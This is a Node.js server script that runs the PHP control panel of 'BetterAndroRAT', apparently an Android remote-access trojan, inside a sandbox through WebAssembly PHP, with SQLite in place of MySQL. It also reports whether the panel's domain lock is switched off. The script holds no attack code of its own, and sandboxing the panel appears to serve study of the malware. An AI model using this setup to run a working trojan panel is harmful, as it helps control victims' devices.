#!/usr/bin/env node
/**
 * BetterAndroRAT panel - sandbox web server.
 *
 * This box has no Apache/PHP/MySQL, so the panel runs on:
 *   * PHP 8.3 compiled to WebAssembly (@php-wasm), i.e. the real PHP runtime,
 *   * with the panel directory mounted read/write through NODEFS,
 *   * talking to SQLite instead of MySQL through the optional $dbdsn override.
 *
 * Nothing here modifies how the panel behaves: it is a plain request/response
 * bridge in front of PHP's CGI SAPI. See README.md for the details.
 */
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { PHP, PHPRequestHandler, loadPHPRuntime, setPhpIniEntries } from '@php-wasm/universal';
import { getPHPLoaderModule } from '@php-wasm/node-8-3';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(__dirname, '..');
const documentRoot = path.join(repoRoot, 'Panel', 'Index');

const PORT = Number(process.env.PORT || 8080);
const HOST = process.env.HOST || '0.0.0.0';

if (!fs.existsSync(documentRoot)) {
  console.error(`Panel directory not found: ${documentRoot}`);
  process.exit(1);
}

const php = new PHP(await loadPHPRuntime(await getPHPLoaderModule()));

// Mount the checkout inside the PHP filesystem at its real path so that every
// absolute path config.php writes (SQLite DSN, dlfiles/) resolves identically.
php.mkdirTree(repoRoot);
await php.mount(repoRoot, (phpInstance, FS, mountPoint) =>
  FS.mount(FS.filesystems.NODEFS, { root: repoRoot }, mountPoint)
);
php.chdir(documentRoot);

await setPhpIniEntries(php, {
  'date.timezone': process.env.TZ || 'UTC',
  'error_reporting': 'E_ALL & ~E_DEPRECATED & ~E_NOTICE',
  'display_errors': '0',
  'log_errors': '0',
  'file_uploads': '1',
  'upload_max_filesize': '50M',
  'post_max_size': '60M',
  'memory_limit': '512M',
  'session.save_path': path.join(repoRoot, 'sandbox', 'data', 'sessions'),
  'session.auto_start': '0',
  'allow_url_fopen': '0',
});
php.mkdirTree(path.join(repoRoot, 'sandbox', 'data', 'sessions'));

const handler = new PHPRequestHandler({
  php,
  documentRoot,
  absoluteUrl: `http://localhost:${PORT}`,
  // Without this, php-wasm keeps one shared cookie jar for the whole runtime
  // and replays it on every request - which would leak the admin session to
  // every visitor of the sandbox. Cookies come from the real request instead.
  cookieStore: false,
});

/**
 * PHP's CGI SAPI runs a script with its own directory as the working directory.
 * php-wasm does not, which breaks the setup wizard (it checks "../reg.php").
 * Emulate the SAPI behaviour here instead of patching the panel.
 */
function workingDirectoryFor(urlPath) {
  const clean = decodeURIComponent(String(urlPath).split('?')[0].split('#')[0]);
  let target = path.normalize(path.join(documentRoot, clean));
  if (!target.startsWith(documentRoot)) return documentRoot;
  try {
    if (fs.statSync(target).isDirectory()) target = path.join(target, 'index.php');
  } catch {
    /* missing file: PHP will 404 it, keep the parent directory */
  }
  return path.dirname(target);
}

const server = http.createServer(async (req, res) => {
  const started = Date.now();
  let response;
  try {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const body = Buffer.concat(chunks);

    const headers = {};
    for (const [name, value] of Object.entries(req.headers)) {
      if (value === undefined) continue;
      headers[name] = Array.isArray(value) ? value.join(', ') : value;
    }

    php.chdir(workingDirectoryFor(req.url));

    response = await handler.request({
      method: req.method,
      url: req.url,
      headers,
      body: body.length ? new Uint8Array(body) : undefined,
    });
  } catch (error) {
    console.error(`[error] ${req.method} ${req.url}:`, error);
    res.writeHead(500, { 'content-type': 'text/plain' });
    res.end('500 Internal Server Error\n');
    return;
  }

  const out = {};
  for (const [name, values] of Object.entries(response.headers || {})) {
    out[name] = Array.isArray(values) ? values : [values];
  }
  const status = response.httpStatusCode || 200;
  res.writeHead(status, out);
  res.end(Buffer.from(response.bytes));

  console.log(`[${new Date().toISOString()}] ${status} ${req.method} ${req.url} (${Date.now() - started}ms)`);
  if (response.errors) console.error(response.errors.trim());
});

const phpVersion = (await php.run({ code: '<?php echo phpversion();' })).text.trim();

server.listen(PORT, HOST, () => {
  console.log(`BetterAndroRAT panel (sandbox) -> http://${HOST}:${PORT}/`);
  console.log(`  document root : ${documentRoot}`);
  console.log(`  php           : ${phpVersion}`);
  const flag = path.join(documentRoot, 'sandbox.flag');
  console.log(`  domain lock   : ${fs.existsSync(flag) ? 'disabled (sandbox.flag present)' : 'ENABLED - run "npm run provision" first'}`);
});

for (const signal of ['SIGINT', 'SIGTERM']) {
  process.on(signal, () => {
    console.log('\nshutting down');
    server.close(() => process.exit(0));
  });
}
